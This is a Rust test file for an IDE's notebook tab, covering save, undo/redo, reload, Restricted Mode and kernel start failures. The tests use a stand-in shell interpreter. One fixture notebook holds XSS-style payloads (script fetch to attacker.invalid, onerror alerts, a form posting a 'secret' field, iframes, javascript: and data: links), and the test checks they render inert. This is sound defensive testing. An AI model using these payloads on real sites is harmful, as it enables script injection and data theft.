//! Notebooks in a project window, against the real backend notebook service: opening a `.ipynb`
//! file, typing, saving, undo and redo, reloading from disk, a rebase over a change made behind
//! the editor, closing, the close question, Restricted Mode, and a kernel that cannot start.
//!
//! No test starts a Python or a Jupyter kernel. The interpreter a notebook runs with is a
//! `/bin/sh` script in the test's temporary folder, answered through [`SdkDetection`] (so the
//! machine's interpreters are never looked for). The kernel speaks ZeroMQ, which a script cannot,
//! so the script only proves whether the backend started it: it writes its process id to a marker
//! file beside it and either exits at once with `No module named ipykernel_launcher` on its error
//! stream and status 1, or waits (`exec sleep 60`) until it is stopped.

use super::*;
use crate::notebook::model::NotebookModel;
use crate::notebook::view::NotebookView;
use crate::settings_view::pages::languages_sdk::{SdkDetection, Toolchain, ToolchainKind};
use gpui_kit::Focusable;

const NOTEBOOK: &str = r##"{
 "cells": [
  {"cell_type": "code", "execution_count": null, "id": "c1", "metadata": {}, "outputs": [], "source": ["print(1)"]},
  {"cell_type": "markdown", "id": "m1", "metadata": {}, "source": ["# Title"]}
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
"##;

/// The folder of a stand-in interpreter. When the test ends, passed or failed, the process the
/// stand-in became is stopped if it still runs, so no test leaves a `sleep` behind.
struct StandIn(tempfile::TempDir);

impl StandIn {
    fn path(&self) -> &std::path::Path {
        self.0.path()
    }
}

impl Drop for StandIn {
    fn drop(&mut self) {
        let Ok(pid) = std::fs::read_to_string(self.0.path().join("started")) else { return };
        let pid = pid.trim();
        // Only the stand-in's own `sleep` is stopped, never a process that reused its id.
        let command = std::process::Command::new("/bin/ps").args(["-o", "command=", "-p", pid]).output();
        if command.is_ok_and(|out| String::from_utf8_lossy(&out.stdout).trim() == "sleep 60") {
            let _ = std::process::Command::new("/bin/kill").args(["-9", pid]).status();
        }
    }
}

/// A stand-in interpreter at `dir/python`: writes its process id to `dir/started`, then exits
/// with an ipykernel error, or (with `waits`) stays until it is stopped.
fn stand_in_python(dir: &std::path::Path, waits: bool) -> PathBuf {
    use std::os::unix::fs::PermissionsExt;
    let script = dir.join("python");
    let marker = dir.join("started");
    let tail = if waits {
        "exec sleep 60\n".to_owned()
    } else {
        "echo 'No module named ipykernel_launcher' >&2\nexit 1\n".to_owned()
    };
    let text = format!("#!/bin/sh\necho $$ > '{}'\n{tail}", marker.display());
    std::fs::write(&script, text).expect("the stand-in is written");
    std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).expect("the stand-in is executable");
    script
}

/// The interpreters the window finds: only `python`.
fn detect_only(python: &std::path::Path, cx: &mut VisualTestContext) {
    let path = python.to_string_lossy().into_owned();
    let toolchain = Toolchain {
        path: path.clone(),
        name: "Stand-in Python".to_owned(),
        version: None,
        source: "venv".to_owned(),
        home: None,
        extra: None,
    };
    let detection = SdkDetection {
        found: vec![(ToolchainKind::Python, vec![toolchain])],
        python: Some(path),
        ..SdkDetection::default()
    };
    cx.update(|_, cx| cx.set_global(detection));
}

/// A trusted project holding `a.ipynb` whose interpreter is a stand-in, with the notebook open
/// and loaded. Returns the notebook's path and the stand-in's folder.
fn open_notebook(
    cx: &mut TestAppContext,
    waits: bool,
) -> (tempfile::TempDir, PathBuf, Entity<Workbench>, StandIn, &mut VisualTestContext) {
    let (folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", NOTEBOOK)]);
    let bin = StandIn(tempfile::tempdir().expect("a folder for the stand-in"));
    let python = stand_in_python(bin.path(), waits);
    detect_only(&python, cx);
    cx.update(|window, _| window.activate_window());
    let file = root.join("a.ipynb");
    workbench.update_in(cx, |w, window, cx| w.open_project_file(file.clone(), window, cx));
    wait_long(cx, "the notebook to load", |cx| {
        notebook(&workbench, cx).is_some_and(|view| {
            view.read_with(cx, |view, cx| {
                let state = view.model().read(cx).state();
                state.snapshot.is_some() && state.python.is_some()
            })
        })
    });
    (folder, file, workbench, bin, cx)
}

fn notebook(workbench: &Entity<Workbench>, cx: &mut VisualTestContext) -> Option<Entity<NotebookView>> {
    workbench.read_with(cx, |w, _| w.notebook_view())
}

fn model_of(workbench: &Entity<Workbench>, cx: &mut VisualTestContext) -> Entity<NotebookModel> {
    let view = notebook(workbench, cx).expect("a notebook tab");
    view.read_with(cx, |view, _| view.model().clone())
}

/// The source of cell `id` as the notebook shows it.
fn shown_source(workbench: &Entity<Workbench>, id: &str, cx: &mut VisualTestContext) -> Option<String> {
    let model = model_of(workbench, cx);
    model.read_with(cx, |model, _| model.cells().into_iter().find(|cell| cell.id == id).map(|cell| cell.source))
}

/// Replaces the text of cell `id`'s editor by typing `text` into it.
fn type_into_cell(workbench: &Entity<Workbench>, id: &str, text: &str, cx: &mut VisualTestContext) {
    let view = notebook(workbench, cx).expect("a notebook tab");
    let area = view.read_with(cx, |view, _| view.cell_editor(id)).expect("the cell shows an editor");
    cx.update(|window, cx| {
        area.update(cx, |area, cx| area.select_all(cx));
        window.focus(&area.focus_handle(cx), cx);
    });
    cx.simulate_input(text);
}

/// Waits until every typed edit is committed by the backend.
fn wait_committed(workbench: &Entity<Workbench>, cx: &mut VisualTestContext) {
    let model = model_of(workbench, cx);
    wait_long(cx, "the edits to be committed", |cx| model.read_with(cx, |model, _| model.state().pending == 0));
}

fn error_text(workbench: &Entity<Workbench>, cx: &mut VisualTestContext) -> Option<String> {
    let view = notebook(workbench, cx)?;
    view.read_with(cx, |view, cx| view.error_text(cx))
}

/// The source of cell `index` as the file on disk holds it (a string or a list of lines).
fn saved_source(file: &std::path::Path, index: usize) -> Option<String> {
    let notebook: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(file).ok()?).ok()?;
    match &notebook["cells"][index]["source"] {
        serde_json::Value::String(text) => Some(text.clone()),
        serde_json::Value::Array(lines) => Some(lines.iter().filter_map(serde_json::Value::as_str).collect()),
        _ => None,
    }
}

/// The backend document of the notebook, by its id.
fn backend_notebook(id: &str, cx: &mut VisualTestContext) -> ide_core::IdeResult<ide_notebook::NotebookSnapshot> {
    cx.update(|_, cx| cx.global::<Backend>().host.project("w1").and_then(|project| project.notebooks.get(id)))
}

/// Opening a `.ipynb` file of the project shows it in a notebook tab titled by its name (not as
/// JSON text); text typed into a code cell is committed to the notebook document and ⌘S writes it.
#[gpui_kit::test]
async fn a_notebook_file_opens_in_a_notebook_tab_and_saves_the_typed_source(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
    let canonical = file.to_string_lossy().into_owned();
    let tab = workbench.read_with(cx, |w, _| {
        let tabs = w.tabs()?;
        let (_, tab) = tabs.find_tab(&format!("notebook:{canonical}"), None)?;
        Some((tab.input.kind.clone(), crate::workbench::tab_views::title_of(&tab.input)))
    });
    assert_eq!(tab, Some(("notebook".to_owned(), Some("a.ipynb".to_owned()))));
    assert!(workbench.read_with(cx, |w, _| w.editor().is_none()), "no text editor shows the JSON");
    assert_eq!(shown_source(&workbench, "c1", cx).as_deref(), Some("print(1)"));
    let view = notebook(&workbench, cx).expect("a notebook tab");
    assert!(!view.read_with(cx, |view, cx| view.model().read(cx).is_dirty()));

    type_into_cell(&workbench, "c1", "print(2)", cx);
    wait_committed(&workbench, cx);
    assert!(view.read_with(cx, |view, cx| view.model().read(cx).is_dirty()), "the notebook is unsaved");
    cx.simulate_keystrokes("cmd-s");
    wait_long(cx, "the notebook to be written", |_| saved_source(&file, 0).as_deref() == Some("print(2)"));
    wait_long(cx, "the saved state", |cx| !view.read_with(cx, |view, cx| view.model().read(cx).is_dirty()));
}

/// The toolbar's Undo takes back the typed source in the backend's notebook history, and Redo
/// brings it back; the cell's editor follows both.
#[gpui_kit::test]
async fn undo_and_redo_of_the_toolbar_go_through_the_notebooks_history(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, _bin, cx) = open_notebook(cx, false);
    type_into_cell(&workbench, "c1", "print(2)", cx);
    wait_committed(&workbench, cx);
    click_on(cx, "notebook-undo");
    wait_long(cx, "the undo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(1)"));
    let view = notebook(&workbench, cx).expect("a notebook tab");
    let editor = view.read_with(cx, |view, _| view.cell_editor("c1")).expect("an editor");
    assert_eq!(editor.read_with(cx, |area, _| area.text().to_owned()), "print(1)");
    let id = model_of(&workbench, cx).read_with(cx, |model, _| model.document_id()).expect("an open document");
    assert_eq!(backend_notebook(&id, cx).expect("the document").cells[0].source, "print(1)");
    click_on(cx, "notebook-redo");
    wait_long(cx, "the redo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(2)"));
    assert_eq!(editor.read_with(cx, |area, _| area.text().to_owned()), "print(2)");
}

/// Reload Notebook from Disk asks first; Discard Changes and Reload drops the unsaved source and
/// shows what the file holds now.
#[gpui_kit::test]
async fn reload_from_disk_asks_then_drops_unsaved_changes_for_the_files_content(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
    type_into_cell(&workbench, "c1", "unsaved draft", cx);
    wait_committed(&workbench, cx);
    std::fs::write(&file, NOTEBOOK.replace("print(1)", "print(3)")).expect("the file changes on disk");
    click_on(cx, "notebook-reload");
    cx.simulate_prompt_answer("Discard Changes and Reload");
    wait_long(cx, "the reload", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(3)"));
    let model = model_of(&workbench, cx);
    assert!(!model.read_with(cx, |model, _| model.is_dirty()));
    assert!(!model.read_with(cx, |model, _| model.state().frozen), "edits resume after the reload");
}

/// A change made to the notebook document behind the editor (another view of it) makes the next
/// typed edit out of date; the editor fetches the current notebook and applies the typing to it.
#[gpui_kit::test]
async fn typing_after_a_change_behind_the_editor_is_rebased_on_the_current_notebook(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, _bin, cx) = open_notebook(cx, false);
    let model = model_of(&workbench, cx);
    let (id, version) = model.read_with(cx, |model, _| {
        let snapshot = model.state().snapshot.as_ref().expect("a snapshot");
        (snapshot.id.clone(), snapshot.version)
    });
    let behind = ide_notebook::NotebookEdit::SetSource { cell: "m1".to_owned(), source: "# Changed".to_owned() };
    cx.update(|_, cx| {
        let project = cx.global::<Backend>().host.project("w1").expect("the project");
        project.notebooks.edit(&id, version, behind).expect("the change behind the editor")
    });
    type_into_cell(&workbench, "c1", "print(5)", cx);
    wait_committed(&workbench, cx);
    let document = backend_notebook(&id, cx).expect("the document");
    assert_eq!((document.cells[0].source.as_str(), document.cells[1].source.as_str()), ("print(5)", "# Changed"));
    assert_eq!(shown_source(&workbench, "m1", cx).as_deref(), Some("# Changed"));
}

/// Closing the only tab of a notebook releases its backend document.
#[gpui_kit::test]
async fn closing_the_last_tab_of_a_notebook_releases_its_backend_document(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
    let id = model_of(&workbench, cx).read_with(cx, |model, _| model.document_id()).expect("an open document");
    assert!(backend_notebook(&id, cx).is_ok());
    let key = format!("notebook:{}", file.to_string_lossy());
    let (pane, tab) = workbench
        .read_with(cx, |w, _| {
            let (pane, tab) = w.tabs()?.find_tab(&key, None)?;
            Some((pane.to_owned(), tab.id.clone()))
        })
        .expect("the notebook's tab");
    workbench.update_in(cx, |w, window, cx| w.run_tab_command(&pane, &tab, TabCommand::Close, window, cx));
    wait_long(cx, "the document to be released", |cx| backend_notebook(&id, cx).is_err());
}

/// Closing an unsaved notebook asks Save / Don't Save / Cancel; Cancel keeps the tab with its
/// changes, Don't Save closes it and the file keeps what it had on disk.
#[gpui_kit::test]
async fn an_unsaved_notebook_asks_before_its_tab_closes(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
    type_into_cell(&workbench, "c1", "print(9)", cx);
    wait_committed(&workbench, cx);
    let key = format!("notebook:{}", file.to_string_lossy());
    let close = |cx: &mut VisualTestContext| {
        let (pane, tab) = workbench
            .read_with(cx, |w, _| {
                let (pane, tab) = w.tabs()?.find_tab(&key, None)?;
                Some((pane.to_owned(), tab.id.clone()))
            })
            .expect("the notebook's tab");
        workbench.update_in(cx, |w, window, cx| w.run_tab_command(&pane, &tab, TabCommand::Close, window, cx));
    };
    close(cx);
    cx.simulate_prompt_answer("Cancel");
    wait_long(cx, "the tab to come back", |cx| notebook(&workbench, cx).is_some());
    assert_eq!(shown_source(&workbench, "c1", cx).as_deref(), Some("print(9)"));
    let model = model_of(&workbench, cx);
    wait_long(cx, "edits to resume", |cx| !model.read_with(cx, |model, _| model.state().frozen));
    close(cx);
    cx.simulate_prompt_answer("Don't Save");
    wait_long(cx, "the tab to close", |cx| {
        workbench.read_with(cx, |w, _| w.tabs().is_some_and(|tabs| tabs.find_tab(&key, None).is_none()))
    });
    assert_eq!(saved_source(&file, 0).as_deref(), Some("print(1)"), "the file is unchanged");
}

/// In Restricted Mode Run Cell and Restart Kernel are refused by the backend with its reason, and
/// the notebook's interpreter is never started.
#[gpui_kit::test]
async fn a_notebook_in_restricted_mode_starts_no_kernel(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, bin, cx) = open_notebook(cx, false);
    run_action(cx, "project.revokeTrust", None);
    wait_long(cx, "Restricted Mode", |cx| workbench.read_with(cx, |w, cx| w.project_restricted(cx)));
    click_on(cx, "notebook-run-cell");
    wait_long(cx, "the refusal", |cx| error_text(&workbench, cx).is_some_and(|e| e.contains("Restricted Mode")));
    let model = model_of(&workbench, cx);
    wait_long(cx, "the end of the run", |cx| !model.read_with(cx, |model, _| model.state().running));
    click_on(cx, "notebook-restart");
    wait_long(cx, "the restart to end", |cx| !model.read_with(cx, |model, _| model.state().frozen));
    assert!(error_text(&workbench, cx).is_some_and(|e| e.contains("Restricted Mode")));
    // Both refusals were answered: the backend checks trust before it admits the batch or touches
    // the kernel, so nothing can start the interpreter after them.
    assert!(!bin.path().join("started").exists(), "the interpreter was never started");
}

/// Run Cell with an interpreter that has no ipykernel: the backend starts it, the kernel's death
/// is shown with the backend's message and the install hint, the kernel state says dead and the
/// batch is over.
#[gpui_kit::test]
async fn a_kernel_that_cannot_start_shows_why_with_the_install_hint(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, bin, cx) = open_notebook(cx, false);
    click_on(cx, "notebook-run-cell");
    wait_long(cx, "the interpreter to start", |_| bin.path().join("started").exists());
    let model = model_of(&workbench, cx);
    wait_long(cx, "the failure", |cx| {
        !model.read_with(cx, |model, _| model.state().running)
            && error_text(&workbench, cx).is_some_and(|e| e.contains("ipykernel"))
    });
    let view = notebook(&workbench, cx).expect("a notebook tab");
    assert!(view.read_with(cx, |view, cx| view.shows_kernel_help(cx)));
    wait_long(cx, "the kernel state", |cx| view.update(cx, |view, cx| view.kernel_text(cx)) == "dead");
    assert!(!model.read_with(cx, |model, _| model.state().frozen), "edits and runs go on");
}

/// Interrupt Kernel while the interpreter is still starting stops the batch and the process the
/// backend started.
#[gpui_kit::test]
async fn interrupt_kernel_stops_a_batch_whose_kernel_is_starting(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, bin, cx) = open_notebook(cx, true);
    let marker = bin.path().join("started");
    click_on(cx, "notebook-run-cell");
    wait_long(cx, "the interpreter to start", |_| std::fs::read_to_string(&marker).is_ok_and(|t| !t.trim().is_empty()));
    let view = notebook(&workbench, cx).expect("a notebook tab");
    let interrupt_on = |cx: &mut VisualTestContext| {
        view.read_with(cx, |view, cx| view.toolbar(cx).iter().any(|b| b.id == "notebook-interrupt" && b.enabled))
    };
    assert!(interrupt_on(cx), "Interrupt Kernel is on while the batch runs");
    click_on(cx, "notebook-interrupt");
    let model = model_of(&workbench, cx);
    wait_long(cx, "the batch to stop", |cx| !model.read_with(cx, |model, _| model.state().running));
    assert!(!interrupt_on(cx));
    let pid = std::fs::read_to_string(&marker).expect("the marker").trim().to_owned();
    wait_long(cx, "the interpreter to be stopped", |_| {
        !std::process::Command::new("/bin/kill").args(["-0", &pid]).status().is_ok_and(|status| status.success())
    });
}

const UNTRUSTED: &str = r##"{
 "cells": [
  {"cell_type": "code", "execution_count": 1, "id": "c1", "metadata": {}, "source": ["show()"], "outputs": [
   {"output_type": "display_data", "metadata": {}, "data": {
    "text/html": "<script>fetch('https://attacker.invalid/x')</script><img src='https://attacker.invalid/i.png' onerror='alert(1)'><form action='https://attacker.invalid'><input name='secret'></form><iframe src='https://attacker.invalid'></iframe><a href='javascript:alert(1)'>html link</a> table text"}},
   {"output_type": "display_data", "metadata": {}, "data": {
    "image/svg+xml": "<svg xmlns='http://www.w3.org/2000/svg'><image href='https://attacker.invalid/s.png'/></svg>", "text/plain": "<Figure>"}}
  ]},
  {"cell_type": "markdown", "id": "m1", "metadata": {}, "source": [
   "[docs](https://example.test/docs)\n\n",
   "[run](javascript:alert%281%29)\n\n",
   "[data](data:text/html;base64,PHNjcmlwdD4=)\n\n",
   "![remote](https://attacker.invalid/r.png) <img src=\"https://attacker.invalid/h.png\" onerror=\"alert(1)\"> <script>alert(1)</script> <iframe src=\"https://attacker.invalid\"></iframe> <form action=\"https://attacker.invalid\"><input name=\"secret\"></form> end"
  ]}
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
"##;

/// A notebook from anywhere draws text only: its HTML output, SVG output and Markdown cell (remote
/// images, scripts, forms, frames, `on…` attributes, `javascript:` and `data:` links) open,
/// fetch and ask nothing of the window. Only a click on a web link opens it, with the system's
/// handler; a click on a `javascript:` or `data:` link does nothing.
#[gpui_kit::test]
async fn a_notebook_from_anywhere_draws_text_only_and_only_a_clicked_web_link_opens(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", UNTRUSTED)]);
    let bin = StandIn(tempfile::tempdir().expect("a folder for the stand-in"));
    detect_only(&stand_in_python(bin.path(), false), cx);
    cx.update(|window, _| window.activate_window());
    workbench.update_in(cx, |w, window, cx| w.open_project_file(root.join("a.ipynb"), window, cx));
    wait_long(cx, "the notebook to load", |cx| {
        notebook(&workbench, cx)
            .is_some_and(|view| view.read_with(cx, |view, cx| view.model().read(cx).state().snapshot.is_some()))
    });
    let view = notebook(&workbench, cx).expect("a notebook tab");
    wait_long(cx, "the outputs to be prepared", |cx| !view.read_with(cx, |view, _| view.decoding_images()));
    let outputs = view.read_with(cx, |view, cx| view.output_texts("c1", cx));
    assert_eq!(outputs, ["html link table text", "<Figure>"]);
    assert_eq!(view.read_with(cx, |view, _| view.drawn_output_images("c1")), 0, "the SVG is not drawn");
    let preview = view.read_with(cx, |view, cx| view.preview_text("m1", cx)).expect("a preview").join("\n");
    for gone in ["attacker.invalid", "alert", "secret"] {
        assert!(!preview.contains(gone), "{gone} in {preview}");
    }
    assert!(preview.contains("remote") && preview.contains("end"), "{preview}");
    assert_eq!(cx.opened_url(), None, "drawing opens nothing");
    assert!(!cx.has_pending_prompt(), "drawing asks nothing");
    click_on(cx, "notebook-cell-1-text-1");
    click_on(cx, "notebook-cell-1-text-2");
    assert_eq!(cx.opened_url(), None, "javascript: and data: links are inert");
    click_on(cx, "notebook-cell-1-text-0");
    assert_eq!(cx.opened_url().as_deref(), Some("https://example.test/docs"));
    assert!(!bin.path().join("started").exists(), "no interpreter was started");
}

/// Without the test's answer, a test build finds no interpreter for a notebook: the backend's
/// detection, which runs the interpreters it finds, is never asked.
#[gpui_kit::test]
async fn a_test_build_without_an_answer_finds_no_interpreter(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, root, workbench, cx) = trusted_project(cx, &[("a.ipynb", NOTEBOOK)]);
    assert!(cx.update(|_, cx| !cx.has_global::<SdkDetection>()));
    cx.update(|window, _| window.activate_window());
    workbench.update_in(cx, |w, window, cx| w.open_project_file(root.join("a.ipynb"), window, cx));
    wait_long(cx, "the notebook to load", |cx| {
        notebook(&workbench, cx)
            .is_some_and(|view| view.read_with(cx, |view, cx| view.model().read(cx).state().snapshot.is_some()))
    });
    let model = model_of(&workbench, cx);
    cx.run_until_parked();
    assert!(model.read_with(cx, |model, _| model.environments().is_empty() && model.state().python.is_none()));
    assert_eq!(error_text(&workbench, cx), None);
}

/// File › Save All with a notebook tab in front writes the notebook's unsaved source to its file.
#[gpui_kit::test]
async fn save_all_writes_the_unsaved_notebook(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, file, workbench, _bin, cx) = open_notebook(cx, false);
    type_into_cell(&workbench, "c1", "print(7)", cx);
    wait_committed(&workbench, cx);
    let model = model_of(&workbench, cx);
    assert!(model.read_with(cx, |model, _| model.is_dirty()));
    run_action(cx, "file.save", None);
    wait_long(cx, "the notebook to be written", |_| saved_source(&file, 0).as_deref() == Some("print(7)"));
    wait_long(cx, "the saved state", |cx| !model.read_with(cx, |model, _| model.is_dirty()));
}

/// Edit › Undo and Redo while a cell has the keyboard go through the notebook's history in the
/// backend, not the cell editor's own: the typed source goes and comes back in the document.
#[gpui_kit::test]
async fn edit_undo_and_redo_in_a_notebook_go_through_its_history(cx: &mut TestAppContext) {
    let _home = start(cx);
    let (_folder, _file, workbench, _bin, cx) = open_notebook(cx, false);
    type_into_cell(&workbench, "c1", "print(8)", cx);
    wait_committed(&workbench, cx);
    let model = model_of(&workbench, cx);
    wait_long(cx, "the undo to be possible", |cx| {
        model.read_with(cx, |model, _| model.state().snapshot.as_ref().is_some_and(|snapshot| snapshot.can_undo))
    });
    run_action(cx, "edit.undo", None);
    wait_long(cx, "the undo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(1)"));
    let id = model.read_with(cx, |model, _| model.document_id()).expect("an open document");
    assert_eq!(backend_notebook(&id, cx).expect("the document").cells[0].source, "print(1)");
    run_action(cx, "edit.redo", None);
    wait_long(cx, "the redo", |cx| shown_source(&workbench, "c1", cx).as_deref() == Some("print(8)"));
    assert_eq!(backend_notebook(&id, cx).expect("the document").cells[0].source, "print(8)");
}
